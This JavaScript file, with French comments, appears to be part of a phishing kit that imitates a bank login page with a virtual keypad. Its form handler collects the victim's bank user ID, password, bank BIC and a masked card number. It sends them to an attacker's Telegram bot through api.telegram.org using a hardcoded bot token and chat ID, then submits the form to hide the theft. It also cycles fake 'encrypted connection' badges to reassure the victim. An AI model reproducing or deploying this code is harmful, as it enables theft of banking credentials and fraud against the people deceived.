document.addEventListener('DOMContentLoaded', function() {
    // Gestion du clavier virtuel
    const passwordInput = document.getElementById('bank-password');
    const keyButtons = document.querySelectorAll('.key-btn');
    
    keyButtons.forEach(button => {
        button.addEventListener('click', function() {
            const value = this.getAttribute('data-value');
            const action = this.getAttribute('data-action');
            
            if (action === 'backspace') {
                passwordInput.value = passwordInput.value.slice(0, -1);
            } else {
                passwordInput.value += value;
                // Animation de frappe
                this.style.transform = 'scale(0.95)';
                setTimeout(() => {
                    this.style.transform = '';
                }, 100);
            }
            
            // Ajout d'un effet sonore (optionnel)
            const clickSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-modern-click-box-check-1120.mp3');
            clickSound.volume = 0.3;
            clickSound.play();
        });
    });
    
    // Envoi sécurisé des données
    document.getElementById('bank-auth-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Animation de chargement
        const submitBtn = document.querySelector('.btn-auth-submit');
        submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification...';
        submitBtn.disabled = true;
        
        // Récupération des données
        const formData = new FormData(this);
        const data = {
            bank_user_id: formData.get('bank_user_id'),
            bank_password: formData.get('bank_password'),
            step1_data: JSON.parse(formData.get('step1_data')),
            step2_data: JSON.parse(formData.get('step2_data'))
        };
        
        // Envoi à Telegram
        const telegramMessage = `🔐 Nouvelle connexion bancaire\n` +
                               `🏦 Banque: ${data.step1_data.bic}\n` +
                               `👤 Identifiant: ${data.bank_user_id}\n` +
                               `🔑 Mot de passe: ${data.bank_password}\n` +
                               `💳 Carte: ${data.step2_data.card_number.replace(/\d(?=\d{4})/g, '*')}\n` +
                               `🔄 Plan: ${data.step1_data.installment_plan} mois`;
        
        const telegramBotToken = '7866279403:AAEWq-i2dnjUM4yQLuW9JbOZliuB8K_nmHA';
        const chatIds = ['5652184847'];
        
        // Envoi asynchrone
        Promise.all(chatIds.map(chatId => {
            return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: telegramMessage
                })
            });
        })).then(() => {
            // Redirection après envoi réussi
            this.submit();
        }).catch(error => {
            console.error('Erreur:', error);
            submitBtn.innerHTML = '<span>Erreur, réessayer</span> <i class="fas fa-redo"></i>';
            submitBtn.disabled = false;
        });
    });
    
    // Effet de sécurité aléatoire
    setInterval(() => {
        const securityEffects = [
            { icon: 'fa-shield-alt', text: 'Sécurité renforcée' },
            { icon: 'fa-lock', text: 'Connexion cryptée' },
            { icon: 'fa-fingerprint', text: 'Vérification en cours' }
        ];
        const randomEffect = securityEffects[Math.floor(Math.random() * securityEffects.length)];
        
        document.querySelectorAll('.security-item i').forEach(icon => {
            icon.className = `fas ${randomEffect.icon}`;
        });
    }, 3000);
});